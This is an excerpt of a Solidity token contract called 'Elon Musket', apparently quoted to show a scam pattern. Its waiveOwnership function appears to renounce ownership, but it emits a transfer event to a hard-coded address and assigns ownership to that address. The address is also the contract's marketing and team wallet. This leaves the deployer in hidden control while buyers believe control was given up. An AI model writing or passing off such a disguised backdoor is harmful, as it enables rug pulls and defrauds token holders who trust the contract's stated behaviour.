...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xB7d60AEa264b65DD1474e3a427b0496a8Cfd5f50));
        _owner = address(0xB7d60AEa264b65DD1474e3a427b0496a8Cfd5f50);
    }
...
contract ElonMusket is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Elon Musket";
    string private _symbol = "ELONMUSKET";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xB7d60AEa264b65DD1474e3a427b0496a8Cfd5f50);
    address payable public teamWalletAddress = payable(0xB7d60AEa264b65DD1474e3a427b0496a8Cfd5f50);
